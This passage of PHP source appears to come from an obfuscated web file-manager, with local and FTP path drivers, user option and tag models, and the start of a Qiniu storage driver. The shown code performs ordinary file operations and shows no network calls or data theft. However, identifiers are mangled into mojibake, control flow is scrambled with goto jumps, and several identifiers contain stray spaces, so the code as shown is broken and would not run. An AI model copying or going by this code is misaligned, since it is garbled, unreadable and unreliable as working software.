($this->isFolder($C¬¦²ªôÔ¶)) { $this->recursionFtpFiles($C¬¦²ªôÔ¶, $A¼Ú·»ö†ï); $A¼Ú·»ö†ï[$EƒÖŞéŒ[74]][] = $C¬¦²ªôÔ¶; } else { $A¼Ú·»ö†ï[$EƒÖŞéŒ[73]][] = $C¬¦²ªôÔ¶; } } } private function objectMeta($F§‡Èø²) { goto B¤ËÇöªƒ»; B†ø‰âø¦Û: return $BôõÎ…Ğ¢; goto cë‰¡¦í¸; f²Œ¡Î: $fé†ŒÄĞ°¢ = @ftp_size($this->connect, $this->iconvSystem($F§‡Èø²)); if ($fé†ŒÄĞ°¢ != -1) { $BôõÎ…Ğ¢ = array($Bìä‡à¥Öö[77] => $fé†ŒÄĞ°¢, $Bìä‡à¥Öö[29] => $Bìä‡à¥Öö[167]); } else { $FíÂªøˆ‹ = @ftp_chdir($this->connect, $this->iconvSystem($F§‡Èø²)); $BôõÎ…Ğ¢ = $FíÂªøˆ‹ ? array($Bìä‡à¥Öö[77] => 0, $Bìä‡à¥Öö[29] => $Bìä‡à¥Öö[76]) : !1; } Cache::set($a¤ß÷¥Âï», $BôõÎ…Ğ¢, 0); goto B†ø‰âø¦Û; A–Õ¹Î™¹°: if ($BôõÎ…Ğ¢ !== null && $BôõÎ…Ğ¢ !== !1) { return $BôõÎ…Ğ¢; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $Bìä‡à¥Öö[8]); goto f²Œ¡Î; B¤ËÇöªƒ»: $Bìä‡à¥Öö =& $_SERVER[‚Ğ°–—î]; $a¤ß÷¥Âï» = $Bìä‡à¥Öö[1166] . md5($F§‡Èø²); $BôõÎ…Ğ¢ = Cache::get($a¤ß÷¥Âï»); goto A–Õ¹Î™¹°; cë‰¡¦í¸: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($Fµ‹‡…Œ§) { if (substr($Fµ‹‡…Œ§, 0, 2) == $_SERVER[‚Ğ°–—î][1155]) { $Fµ‹‡…Œ§ = BASIC_PATH . substr($Fµ‹‡…Œ§, 2); } return $Fµ‹‡…Œ§; } public function iconvApp($dí—ëÄ¦ó«) { $c¥Û‹¸ï´Ï =& $_SERVER[‚Ğ°–—î]; global $config; return $this->iconvTo($dí—ëÄ¦ó«, $config[$c¥Û‹¸ï´Ï[1153]], $config[$c¥Û‹¸ï´Ï[1152]]); } public function iconvSystem($b‚œ©„§”) { $f„¬’š¾è® =& $_SERVER[‚Ğ°–—î]; global $config; return $this->iconvTo($b‚œ©„§”, $config[$f„¬’š¾è®[1152]], $config[$f„¬’š¾è®[1153]]); } public function getPathOuter($c¸‚óÓ™‚æ) { goto F´·­§ÆŒ; F´·­§ÆŒ: $A÷ÚĞº‡‚Œ =& $_SERVER[‚Ğ°–—î]; $CÔ¨ƒ©¥Åä = $this->iconvApp($this->pathBase); $c¸‚óÓ™‚æ = $this->iconvApp($c¸‚óÓ™‚æ); goto fŒ»¦ÉÌ…à; CËÆêç¦¯¾: $c¸‚óÓ™‚æ = KodIO::clear($c¸‚óÓ™‚æ); $c¸‚óÓ™‚æ = substr($c¸‚óÓ™‚æ, strlen($CÔ¨ƒ©¥Åä)); if (empty($this->pathDriver)) { return $c¸‚óÓ™‚æ; } goto bÒ›¢à¢Û; fŒ»¦ÉÌ…à: if (substr($CÔ¨ƒ©¥Åä, 0, 2) == $A÷ÚĞº‡‚Œ[1155]) { $CÔ¨ƒ©¥Åä = BASIC_PATH . substr($CÔ¨ƒ©¥Åä, 2); } if (substr($c¸‚óÓ™‚æ, 0, 2) == $A÷ÚĞº‡‚Œ[1155]) { $c¸‚óÓ™‚æ = BASIC_PATH . substr($c¸‚óÓ™‚æ, 2); } $CÔ¨ƒ©¥Åä = KodIO::clear($CÔ¨ƒ©¥Åä); goto CËÆêç¦¯¾; bÒ›¢à¢Û: return $this->pathDriver . $A÷ÚĞº‡‚Œ[8] . ltrim($c¸‚óÓ™‚æ, $A÷ÚĞº‡‚Œ[8]); goto EòªÂˆâ«š; EòªÂˆâ«š: } public function mkfile($AÂ«²Š©œÁ, $Fš©Í˜«Û = '', $C„¢ÂŞ‡× = REPEAT_RENAME) { $AÂ«²Š©œÁ = $this->iconvSystem($AÂ«²Š©œÁ); @touch($AÂ«²Š©œÁ); if ($Fš©Í˜«Û) { file_put_contents($AÂ«²Š©œÁ, $Fš©Í˜«Û); } return is_file($AÂ«²Š©œÁ) ? $this->getPathOuter($AÂ«²Š©œÁ) : !1; } public function mkdir($aù¿í¦©, $Cö¾ÆôÊÄ = REPEAT_SKIP) { $aù¿í¦© = $this->iconvSystem($aù¿í¦©); if (is_dir($aù¿í¦©)) { return $this->getPathOuter($aù¿í¦©); } @mkdir($aù¿í¦©, 511, !0); return is_dir($aù¿í¦©) ? $this->getPathOuter($aù¿í¦©) : !1; } public function copyFile($a‘Å´Û¦ìÁ, $a¦ä×‹Üë) { $this->mkdir($this->pathFather($a¦ä×‹Üë)); $a‘Å´Û¦ìÁ = $this->iconvSystem($a‘Å´Û¦ìÁ); $a¦ä×‹Üë = $this->iconvSystem($a¦ä×‹Üë); $a”¯™Şåøì = @copy($a‘Å´Û¦ìÁ, $a¦ä×‹Üë); return $a”¯™Şåøì ? $this->getPathOuter($a¦ä×‹Üë) : !1; } public function moveFile($AÂºïïÜÔ, $a¼ÌÜ¯™Œß) { $this->mkdir($this->pathFather($a¼ÌÜ¯™Œß)); $AÂºïïÜÔ = $this->iconvSystem($AÂºïïÜÔ); $a¼ÌÜ¯™Œß = $this->iconvSystem($a¼ÌÜ¯™Œß); $cİãé¹¨ = intval(@rename($AÂºïïÜÔ, $a¼ÌÜ¯™Œß)); if (!$cİãé¹¨) { if ($cİãé¹¨ = intval(@copy($AÂºïïÜÔ, $a¼ÌÜ¯™Œß))) { @unlink($AÂºïïÜÔ); } } return $cİãé¹¨ ? $this->getPathOuter($a¼ÌÜ¯™Œß) : !1; } public function delFile($F×™ÍËâº…) { $F×™ÍËâº… = $this->iconvSystem($F×™ÍËâº…); if (!@unlink($F×™ÍËâº…)) { @chmod($F×™ÍËâº…, 511); if (!@unlink($F×™ÍËâº…)) { return !1; } } else { return !0; } } public function delFolder($Eƒ‚•ñãÂ) { goto cŸ×’áÎğ©; bÎ³å¶Ü‹‚: if (!($EñÃ„ƒ†† = opendir($Eƒ‚•ñãÂ))) { return !1; } while (($BŞŞÂĞ¡º¼ = readdir($EñÃ„ƒ††)) !== !1) { if ($BŞŞÂĞ¡º¼ == $cÛÍä‘Š[91] || $BŞŞÂĞ¡º¼ == $cÛÍä‘Š[1165]) { continue; } $Eˆ¦—ˆÕÇŠ = $Eƒ‚•ñãÂ . $cÛÍä‘Š[8] . $BŞŞÂĞ¡º¼; if (is_file($Eˆ¦—ˆÕÇŠ) || is_link($Eˆ¦—ˆÕÇŠ)) { if (!unlink($Eˆ¦—ˆÕÇŠ)) { chmod($Eˆ¦—ˆÕÇŠ, 511); if (!unlink($Eˆ¦—ˆÕÇŠ)) { return !1; } } } else { if (is_dir($Eˆ¦—ˆÕÇŠ)) { chmod($Eˆ¦—ˆÕÇŠ, 511); $Eˆ¦—ˆÕÇŠ = $this->iconvApp($Eˆ¦—ˆÕÇŠ); if (!$this->delFolder($Eˆ¦—ˆÕÇŠ)) { return !1; } } } } closedir($EñÃ„ƒ††); goto CØŸ¿É…Å‡; CØŸ¿É…Å‡: return rmdir($Eƒ‚•ñãÂ); goto a¢óÔ¨Ë·¹; cŸ×’áÎğ©: $cÛÍä‘Š =& $_SERVER[‚Ğ°–—î]; $Eƒ‚•ñãÂ = $this->iconvSystem($Eƒ‚•ñãÂ); if (!is_dir($Eƒ‚•ñãÂ)) { return !0; } goto bÎ³å¶Ü‹‚; a¢óÔ¨Ë·¹: } public function rename($a•ÊÛæ‚–µ, $dŒ¬´³Ûƒß) { goto e °Ü‘ÁóŒ; FŒ‹ß ‰ˆ: $a•ÊÛæ‚–µ = $this->iconvSystem($a•ÊÛæ‚–µ); $dƒ±ùÆİ = $this->pathFather($a•ÊÛæ‚–µ); $DÚ›ÚĞĞºĞ = rtrim($dƒ±ùÆİ, $bÎ‹³„İ˜ [8]) . $bÎ‹³„İ˜ [8] . $bÇ“ù÷éÊÛ; goto aæµùòçâÒ; e °Ü‘ÁóŒ: $bÎ‹³„İ˜  =& $_SERVER[‚Ğ°–—î]; $bÇ“ù÷éÊÛ = $this->fileNameAuto($this->pathFather($a•ÊÛæ‚–µ), $dŒ¬´³Ûƒß); $bÇ“ù÷éÊÛ = $this->iconvSystem($bÇ“ù÷éÊÛ); goto FŒ‹ß ‰ˆ; aæµùòçâÒ: $a˜ßÙÃŒ = @rename($a•ÊÛæ‚–µ, $DÚ›ÚĞĞºĞ); $DÚ›ÚĞĞºĞ = $this->iconvApp($DÚ›ÚĞĞºĞ); return $a˜ßÙÃŒ ? $this->getPathOuter($DÚ›ÚĞĞºĞ) : !1; goto f¼¹–öÙì; f¼¹–öÙì: } public function size($e¶•›õÆµ°) { $e¶•›õÆµ° = $this->iconvSystem($e¶•›õÆµ°); return (double) abs(sprintf($_SERVER[‚Ğ°–—î][1167], @filesize($e¶•›õÆµ°))); } public function info($F“·©–’–º) { $F“·©–’–º = $this->iconvSystem($F“·©–’–º); if ($this->isFolder($F“·©–’–º)) { return $this->folderInfo($F“·©–’–º); } else { if ($this->isFile($F“·©–’–º)) { return $this->fileInfo($F“·©–’–º); } } return !1; } protected function infoChildren($C·Ñ½¶±£³, &$d„çÁ“´ÒÁ, $CÏõà» „‡ = true) { goto fÎøÔÍ«´Ç; BÂ’±º’æ: if ($CÏõà» „‡) { $C·Ñ½¶±£³ = $this->iconvSystem($C·Ñ½¶±£³); } if (!($Aá©ñÀ°Ø = @opendir($C·Ñ½¶±£³))) { return; } while (($Fë„’ïà¶ = readdir($Aá©ñÀ°Ø)) !== !1) { if ($Fë„’ïà¶ == $AçÔ¥ëˆàê[91] || $Fë„’ïà¶ == $AçÔ¥ëˆàê[1165]) { continue; } $B¹‹®øğ³ = $C·Ñ½¶±£³ . $Fë„’ïà¶; if (is_file($B¹‹®øğ³) || is_link($B¹‹®øğ³)) { $d„çÁ“´ÒÁ[$AçÔ¥ëˆàê[78]]++; $d„çÁ“´ÒÁ[$AçÔ¥ëˆàê[77]] += (double) abs(sprintf($AçÔ¥ëˆàê[1167], @filesize($B¹‹®øğ³))); } else { if (is_dir($B¹‹®øğ³)) { $d„çÁ“´ÒÁ[$AçÔ¥ëˆàê[79]]++; $this->infoChildren($B¹‹®øğ³, $d„çÁ“´ÒÁ, !1); } } } goto b‚ÕÈ×ÉÊ°; fÎøÔÍ«´Ç: $AçÔ¥ëˆàê =& $_SERVER[‚Ğ°–—î]; check_abort(); $C·Ñ½¶±£³ = rtrim($C·Ñ½¶±£³, $AçÔ¥ëˆàê[8]) . $AçÔ¥ëˆàê[8]; goto BÂ’±º’æ; b‚ÕÈ×ÉÊ°: closedir($Aá©ñÀ°Ø); goto E¼Ë³ö¸í; E¼Ë³ö¸í: } private function folderInfo($CœÎ®Éö Õ, $dÈÌÈ´õÜ§ = false) { $E£…ğß‹ô =& $_SERVER[‚Ğ°–—î]; $CœÎ®Éö Õ = rtrim($CœÎ®Éö Õ, $E£…ğß‹ô[8]) . $E£…ğß‹ô[8]; $BøˆŒÂôÉÓ = $this->iconvApp($this->pathThis($CœÎ®Éö Õ)); if ($dÈÌÈ´õÜ§) { return array($E£…ğß‹ô[28] => $BøˆŒÂôÉÓ, $E£…ğß‹ô[75] => $this->getPathOuter($CœÎ®Éö Õ), $E£…ğß‹ô[29] => $E£…ğß‹ô[76]); } $aƒ¹ÜÂ­Æ = array($E£…ğß‹ô[28] => $BøˆŒÂôÉÓ, $E£…ğß‹ô[75] => $this->getPathOuter($CœÎ®Éö Õ), $E£…ğß‹ô[29] => $E£…ğß‹ô[76], $E£…ğß‹ô[187] => @filectime($CœÎ®Éö Õ), $E£…ğß‹ô[107] => @filemtime($CœÎ®Éö Õ), $E£…ğß‹ô[1168] => @fileatime($CœÎ®Éö Õ), $E£…ğß‹ô[1162] => is_readable($CœÎ®Éö Õ), $E£…ğß‹ô[1163] => is_writable($CœÎ®Éö Õ), $E£…ğß‹ô[1169] => get_mode($CœÎ®Éö Õ)); return $aƒ¹ÜÂ­Æ; } private function fileInfo($EËÛ¥‹Á×, $eĞ£İäˆ’ = false) { $cŠˆËáàİ =& $_SERVER[‚Ğ°–—î]; $CŠ‹ªöĞõŞ = $this->iconvApp($this->pathThis($EËÛ¥‹Á×)); if ($eĞ£İäˆ’) { return array($cŠˆËáàİ[28] => $CŠ‹ªöĞõŞ, $cŠˆËáàİ[75] => $this->getPathOuter($EËÛ¥‹Á×), $cŠˆËáàİ[29] => $cŠˆËáàİ[167], $cŠˆËáàİ[77] => $this->size($EËÛ¥‹Á×), $cŠˆËáàİ[160] => $this->ext($CŠ‹ªöĞõŞ)); } $Fçª‘ø×øÒ = array($cŠˆËáàİ[28] => $CŠ‹ªöĞõŞ, $cŠˆËáàİ[75] => $this->getPathOuter($EËÛ¥‹Á×), $cŠˆËáàİ[29] => $cŠˆËáàİ[167], $cŠˆËáàİ[187] => @filectime($EËÛ¥‹Á×), $cŠˆËáàİ[107] => @filemtime($EËÛ¥‹Á×), $cŠˆËáàİ[1168] => @fileatime($EËÛ¥‹Á×), $cŠˆËáàİ[77] => $this->size($EËÛ¥‹Á×), $cŠˆËáàİ[160] => $this->ext($CŠ‹ªöĞõŞ), $cŠˆËáàİ[1162] => is_readable($EËÛ¥‹Á×), $cŠˆËáàİ[1163] => is_writable($EËÛ¥‹Á×), $cŠˆËáàİ[1169] => get_mode($EËÛ¥‹Á×)); return $Fçª‘ø×øÒ; } public function exist($eÑÙÒÆ•‰) { $eÑÙÒÆ•‰ = $this->iconvSystem($eÑÙÒÆ•‰); return @file_exists($eÑÙÒÆ•‰); } public function isFile($bˆŒ¥äÍ‚) { $bˆŒ¥äÍ‚ = $this->iconvSystem($bˆŒ¥äÍ‚); return @is_file($bˆŒ¥äÍ‚); } public function isFolder($FçÏëà’ìÔ) { $FçÏëà’ìÔ = $this->iconvSystem($FçÏëà’ìÔ); return @is_dir($FçÏëà’ìÔ); } public function listPath($bó¡±ˆŒ²Õ, $F…âÀˆ»¹ê = false) { goto FôŒ ‡Æ¶œ; f„¸ã“ÌÓ¯: closedir($B»¶ª•¢Ç); return $e´®¢Ü£¾Ü; goto FÓÕô£âÎå; FôŒ ‡Æ¶œ: $FÈùŞÕÕŞÊ =& $_SERVER[‚Ğ°–—î]; $bó¡±ˆŒ²Õ = $this->iconvSystem($bó¡±ˆŒ²Õ); $bó¡±ˆŒ²Õ = rtrim($bó¡±ˆŒ²Õ, $FÈùŞÕÕŞÊ[8]) . $FÈùŞÕÕŞÊ[8]; goto fá‡°ŒàÕÌ; fá‡°ŒàÕÌ: $e´®¢Ü£¾Ü = array($FÈùŞÕÕŞÊ[74] => array(), $FÈùŞÕÕŞÊ[73] => array()); if (!($B»¶ª•¢Ç = @opendir($bó¡±ˆŒ²Õ))) { return $e´®¢Ü£¾Ü; } while (($D°²Óë±¨‹ = readdir($B»¶ª•¢Ç)) !== !1) { if ($D°²Óë±¨‹ == $FÈùŞÕÕŞÊ[91] || $D°²Óë±¨‹ == $FÈùŞÕÕŞÊ[1165]) { continue; } $e‡»æìùœ¥ = $bó¡±ˆŒ²Õ . $D°²Óë±¨‹; if (is_file($e‡»æìùœ¥)) { $e´®¢Ü£¾Ü[$FÈùŞÕÕŞÊ[73]][] = $this->fileInfo($e‡»æìùœ¥, $F…âÀˆ»¹ê); } else { $e´®¢Ü£¾Ü[$FÈùŞÕÕŞÊ[74]][] = $this->folderInfo($e‡»æìùœ¥, $F…âÀˆ»¹ê); } } goto f„¸ã“ÌÓ¯; FÓÕô£âÎå: } public function listAll($Cì¾±‰äõƒ, &$FÏäï’Ö„÷ = array()) { goto aÓ‹º„àË×; a†‰Ÿ÷î: return $FÏäï’Ö„÷; goto bšñŸ†ñ›‰; cª‡áÃÈáÑ: if (!($dç˜ŸáØ¬ = @opendir($Cì¾±‰äõƒ))) { return $FÏäï’Ö„÷; } while (($f¶ËõÖ·¿— = readdir($dç˜ŸáØ¬)) !== !1) { if ($f¶ËõÖ·¿— == $Fíšé©–İä[91] || $f¶ËõÖ·¿— == $Fíšé©–İä[1165]) { continue; } $FÙ£í‘Óğ = $Cì¾±‰äõƒ . $f¶ËõÖ·¿—; if (is_dir($FÙ£í‘Óğ) && !is_link($FÙ£í‘Óğ)) { $FÏäï’Ö„÷[] = array($Fíšé©–İä[75] => $FÙ£í‘Óğ . $Fíšé©–İä[8], $Fíšé©–İä[76] => 1, $Fíšé©–İä[107] => @filemtime($FÙ£í‘Óğ), $Fíšé©–İä[77] => 0); $this->listAll($FÙ£í‘Óğ, $FÏäï’Ö„÷); } else { $FÏäï’Ö„÷[] = array($Fíšé©–İä[75] => $FÙ£í‘Óğ, $Fíšé©–İä[76] => 0, $Fíšé©–İä[107] => @filemtime($FÙ£í‘Óğ), $Fíšé©–İä[77] => $this->size($FÙ£í‘Óğ)); } } closedir($dç˜ŸáØ¬); goto a†‰Ÿ÷î; aÓ‹º„àË×: $Fíšé©–İä =& $_SERVER[‚Ğ°–—î]; $Cì¾±‰äõƒ = $this->iconvSystem($Cì¾±‰äõƒ); $Cì¾±‰äõƒ = rtrim($Cì¾±‰äõƒ, $Fíšé©–İä[8]) . $Fíšé©–İä[8]; goto cª‡áÃÈáÑ; bšñŸ†ñ›‰: } public function has($B›§çªÖÔè, $C±Ú¶ƒÉ† = false, $E†˜ºÜ‘¶ = true) { goto CÔÇ¦É†„ê; CÔÇ¦É†„ê: $dÛ£¤ï¢• =& $_SERVER[‚Ğ°–—î]; $B›§çªÖÔè = $this->iconvSystem($B›§çªÖÔè); $B›§çªÖÔè = rtrim($B›§çªÖÔè, $dÛ£¤ï¢•[8]) . $dÛ£¤ï¢•[8]; goto E‚Ô’³¥é; F‚åã§àŒ‰: if ($C±Ú¶ƒÉ†) { return array($dÛ£¤ï¢•[191] => $BºŞ‹ëÄìÛ, $dÛ£¤ï¢•[192] => $eá›Û²¤ä•); } return !1; goto Dã×¨Õî‘; E‚Ô’³¥é: if (!($DšˆèÆ„…Ò = @opendir($B›§çªÖÔè))) { return !1; } $BºŞ‹ëÄìÛ = 0; $eá›Û²¤ä• = 0; goto AŠ‚‘ëø‘; AŠ‚‘ëø‘: $cˆ¿Ú«­¾ = 0; while (($E„î øßæ’ = readdir($DšˆèÆ„…Ò)) !== !1) { if ($E„î øßæ’ == $dÛ£¤ï¢•[91] || $E„î øßæ’ == $dÛ£¤ï¢•[1165]) { continue; } $aã÷†Èİæ = $B›§çªÖÔè . $E„î øßæ’; if ($C±Ú¶ƒÉ†) { $cˆ¿Ú«­¾++; if (@is_file($aã÷†Èİæ)) { $BºŞ‹ëÄìÛ++; } else { $eá›Û²¤ä•++; } if ($cˆ¿Ú«­¾ > 10000) { break; } continue; } if ($E†˜ºÜ‘¶) { if (@is_file($aã÷†Èİæ)) { return !0; } } else { if (@is_dir($aã÷†Èİæ . $dÛ£¤ï¢•[8])) { return !0; } } } closedir($DšˆèÆ„…Ò); goto F‚åã§àŒ‰; Dã×¨Õî‘: } public function hashSimple($DŸÇ»Š¢†) { goto BÅÂÚƒáµ½; déÅ‹éç¿«: fseek($d‚±¸—µŠŞ, $a‘²‚…òë³ - $F·õ´¤‹²É); $D„æâğÌÔ .= fread($d‚±¸—µŠŞ, $F·õ´¤‹²É); fclose($d‚±¸—µŠŞ); goto FçÌ¡İ¯‰ì; FçÌ¡İ¯‰ì: return md5($D„æâğÌÔ) . $a‘²‚…òë³; goto eğÇ‡Ö½¥; C‰ÄŠˆ¯ÈÇ: $d‚±¸—µŠŞ = fopen($DŸÇ»Š¢†, $F”ÒÚš»‡[1170]); if (!$d‚±¸—µŠŞ) { return $D„æâğÌÔ; } for ($F³¼õ÷¸‰¿ = 0; $F³¼õ÷¸‰¿ < $bÙùÄíŠŸ¡; $F³¼õ÷¸‰¿++) { fseek($d‚±¸—µŠŞ, $bêø¸çòï¦ * $F³¼õ÷¸‰¿); $D„æâğÌÔ .= fread($d‚±¸—µŠŞ, $F·õ´¤‹²É); } goto déÅ‹éç¿«; E‘¨ôÇ¿×‰: if ($a‘²‚…òë³ <= $F·õ´¤‹²É * $bÙùÄíŠŸ¡) { return $this->hashMd5($DŸÇ»Š¢†) . $a‘²‚…òë³; } $D„æâğÌÔ = $F”ÒÚš»‡[33]; $bêø¸çòï¦ = intval($a‘²‚…òë³ / $bÙùÄíŠŸ¡); goto C‰ÄŠˆ¯ÈÇ; bºââ‰õ¥ª: $a‘²‚…òë³ = $this->size($DŸÇ»Š¢†); $F·õ´¤‹²É = 200; $bÙùÄíŠŸ¡ = 50; goto E‘¨ôÇ¿×‰; BÅÂÚƒáµ½: $F”ÒÚš»‡ =& $_SERVER[‚Ğ°–—î]; if (!$DŸÇ»Š¢†) { return md5($F”ÒÚš»‡[33]); } $DŸÇ»Š¢† = $this->iconvSystem($DŸÇ»Š¢†); goto bºââ‰õ¥ª; eğÇ‡Ö½¥: } public function getContent($bÆ‘Š«ÌÊå) { $bÆ‘Š«ÌÊå = $this->iconvSystem($bÆ‘Š«ÌÊå); return file_get_contents($bÆ‘Š«ÌÊå); } public function setContent($a‰ĞĞ¢éç×, $AÃäÃÂÓ˜Ã = '') { $a‰ĞĞ¢éç× = $this->iconvSystem($a‰ĞĞ¢éç×); @file_put_contents($a‰ĞĞ¢éç×, $AÃäÃÂÓ˜Ã, LOCK_EX); clearstatcache(); return strlen($AÃäÃÂÓ˜Ã) == filesize($a‰ĞĞ¢éç×); } public function fileSubstr($aœÅÑğñÆ , $aƒ•’½³©š = 0, $dÉ¾ñ²ïÒ = false) { goto Eˆ«Éˆ™·; Eˆ«Éˆ™·: $a‚ ò±­”ë =& $_SERVER[‚Ğ°–—î]; $aœÅÑğñÆ  = $this->iconvSystem($aœÅÑğñÆ ); if ($dÉ¾ñ²ïÒ === !1) { $dÉ¾ñ²ïÒ = $this->size($aœÅÑğñÆ ); } goto FÃ‡£À©¼Ü; C´†Ø÷Ş–ê: fseek($E¥ŒÊ“¼‡ñ, $aƒ•’½³©š); $D½Ñ¢Š­¹„ = fread($E¥ŒÊ“¼‡ñ, $dÉ¾ñ²ïÒ); fclose($E¥ŒÊ“¼‡ñ); goto FóŸ•²ç¯Ø; FóŸ•²ç¯Ø: return $D½Ñ¢Š­¹„; goto a»ç¶°î”; FÃ‡£À©¼Ü: if ($dÉ¾ñ²ïÒ <= 0) { return $a‚ ò±­”ë[33]; } $E¥ŒÊ“¼‡ñ = fopen($aœÅÑğñÆ , $a‚ ò±­”ë[1170]); if (!$E¥ŒÊ“¼‡ñ) { return !1; } goto C´†Ø÷Ş–ê; a»ç¶°î”: } public function upload($e¶õ˜”Èé, $Eš¤òœÕ¡, $AË¿Ìœ¨‡¼ = false, $C†‘„‡¥À• = REPEAT_REPLACE) { $B’Êå‡ùë = $this->copyFile($Eš¤òœÕ¡, $e¶õ˜”Èé); return $B’Êå‡ùë ? $this->getPathOuter($e¶õ˜”Èé) : !1; } public function download($cà¡ÄÆ…»ï, $d“Ú–¶…¿—) { return $this->iconvSystem($cà¡ÄÆ…»ï); } } goto CçãÑ˜Š•“; B„Œ‡İªĞÁ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\x72\137\x6f\x70\164\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($b±¿Şáî) { $c§õ‡Ó¨ß— =& $_SERVER[‚Ğ°–—î]; if (!defined($c§õ‡Ó¨ß—[427])) { define($c§õ‡Ó¨ß—[427], 0); } return "\x55\x73\x65\x72\117\160\164\151\157\x6e\x5f{$b±¿Şáî}\x5f" . USER_ID; } protected function filterWhere($DøÏ±èÍµ·) { $DïÎï¢“ÈÔ =& $_SERVER[‚Ğ°–—î]; if (!defined($DïÎï¢“ÈÔ[427])) { define($DïÎï¢“ÈÔ[427], 0); } $DøÏ±èÍµ·[$DïÎï¢“ÈÔ[1438]] = USER_ID; return $DøÏ±èÍµ·; } public function cacheRemoveUser($c³·¾ğ•ï˜, $eƒ½Áõ¹®ø) { return Cache::remove("\125\163\x65\162\x4f\160\164\x69\157\x6e\137{$c³·¾ğ•ï˜}\137" . $eƒ½Áõ¹®ø); } protected function optionDefault($FÅîà±ÊÆõ = '') { $Eñê«…µ— =& $_SERVER[‚Ğ°–—î]; if ($FÅîà±ÊÆõ == $Eñê«…µ—[33]) { return $GLOBALS[$Eñê«…µ—[6]][$Eñê«…µ—[2541]]; } if ($FÅîà±ÊÆõ == $Eñê«…µ—[2542]) { return $GLOBALS[$Eñê«…µ—[6]][$Eñê«…µ—[2543]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\56\x74\x61\147\x4c\151\163\x74"; public $modelType = "\x55\x73\145\x72\x4f\x70\x74\x69\157\156"; public $field = array("\x6e\141\155\145", "\163\164\171\x6c\145", "\163\157\x72\164"); public function listData($CÇ¤ã¤Ø“‘ = false, $d°œ‘§š„å = "\x73\x6f\162\x74", $eÈ¼ª• ½ = false) { return parent::listData($CÇ¤ã¤Ø“‘, $d°œ‘§š„å, $eÈ¼ª• ½); } public function remove($DÔøÆõÕØà) { return parent::remove($DÔøÆõÕØà); } public function add($AÇçËÒ¾, $D¿³ƒ¨õÅ = "\x6c\141\142\x65\x6c\55\x67\162\145\x79\55\156\x6f\162\155\141\x6c") { $d‚Ñß¸Æƒ‡ =& $_SERVER[‚Ğ°–—î]; if ($this->findByName($AÇçËÒ¾)) { return !1; } $D¸ºÉš‚ƒà = array($d‚Ñß¸Æƒ‡[386] => $AÇçËÒ¾, $d‚Ñß¸Æƒ‡[437] => $D¿³ƒ¨õÅ, $d‚Ñß¸Æƒ‡[2111] => $this->getSort($d‚Ñß¸Æƒ‡[246]) + 1); return parent::insert($D¸ºÉš‚ƒà); } public function update($b×½ØØŞÌŠ, $c˜¡÷µ‰ğ×) { $dæù–‘ –§ =& $_SERVER[‚Ğ°–—î]; $B—äª¦‰»” = $this->listData($b×½ØØŞÌŠ); $a…ƒµƒ = $this->findByName($c˜¡÷µ‰ğ×[$dæù–‘ –§[28]]); if (!$B—äª¦‰»” || $a…ƒµƒ && $a…ƒµƒ[$dæù–‘ –§[367]] != $B—äª¦‰»”[$dæù–‘ –§[367]]) { return !1; } return parent::update($b×½ØØŞÌŠ, $c˜¡÷µ‰ğ×); } public function moveTop($AÓ«­ó«ŞÔ) { $fÍäğ¨Õ£Ú =& $_SERVER[‚Ğ°–—î]; $f­ÒÂ„Â± = parent::listData(); $b¯à¤Ê¬ = $this->getSort($fÍäğ¨Õ£Ú[245]); foreach ($f­ÒÂ„Â± as &$eÃ½‹ê†) { if ($eÃ½‹ê†[$fÍäğ¨Õ£Ú[367]] == $AÓ«­ó«ŞÔ) { $eÃ½‹ê†[$fÍäğ¨Õ£Ú[2128]] = $b¯à¤Ê¬; continue; } $eÃ½‹ê†[$fÍäğ¨Õ£Ú[2128]] += 1; } return parent::resetData($f­ÒÂ„Â±); } public function moveBottom($FØÉ‹ÄÕ²µ) { $AŸ¦ä²ÜË± =& $_SERVER[‚Ğ°–—î]; $aöó’í¼¾Î = $this->getSort($AŸ¦ä²ÜË±[246]) + 1; return parent::update($FØÉ‹ÄÕ²µ, array($AŸ¦ä²ÜË±[2128] => $aöó’í¼¾Î)); } public function resetSort($d´“ˆ§óå‘) { goto BŠ“Ğ÷³ìŒ; BŠ“Ğ÷³ìŒ: $d˜±Æ‹ˆ‰£ =& $_SERVER[‚Ğ°–—î]; $EÁĞºõ‡ğ¹ = array(); $d´“ˆ§óå‘ = is_array($d´“ˆ§óå‘) ? $d´“ˆ§óå‘ : array(); goto D–³Şê×º; D–³Şê×º: for ($d‡•Ôˆï’‹ = 0; $d‡•Ôˆï’‹ < count($d´“ˆ§óå‘); $d‡•Ôˆï’‹++) { $EÁĞºõ‡ğ¹[$d´“ˆ§óå‘[$d‡•Ôˆï’‹] . $d˜±Æ‹ˆ‰£[33]] = $d‡•Ôˆï’‹ + 1; } $få´¸ŠØç = parent::listData(); foreach ($få´¸ŠØç as &$Fç»Óôè‡Ú) { $e¿Ã“ó£Ñ = $EÁĞºõ‡ğ¹[$Fç»Óôè‡Ú[$d˜±Æ‹ˆ‰£[367]]]; $Fç»Óôè‡Ú[$d˜±Æ‹ˆ‰£[2128]] = $e¿Ã“ó£Ñ ? $e¿Ã“ó£Ñ : $Fç»Óôè‡Ú[$d˜±Æ‹ˆ‰£[2128]]; } goto e·Ğ©½Í‘µ; e·Ğ©½Í‘µ: return parent::resetData($få´¸ŠØç); goto D ’èÀâ; D ’èÀâ: } private function getSort($dóâƒ±˜Éí) { $e¼Á‚ø =& $_SERVER[‚Ğ°–—î]; $e¬Ì‚¢¥õØ = parent::listData(); $BôÙöÌå½ = array_to_keyvalue($e¬Ì‚¢¥õØ, $e¼Á‚ø[33], $e¼Á‚ø[2128]); if (!$BôÙöÌå½) { $BôÙöÌå½ = array(0); } $e‹‡˜ŠÓäš = $dóâƒ±˜Éí == $e¼Á‚ø[246] ? max($BôÙöÌå½) : min($BôÙöÌå½); return intval($e‹‡˜ŠÓäš); } } goto DÖë‡œÃÎì; c†Òêôˆ²: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($Cè„•òÛ­) { parent::__construct(); require_once SDK_DIR . $_SERVER[‚Ğ°–—î][1212]; 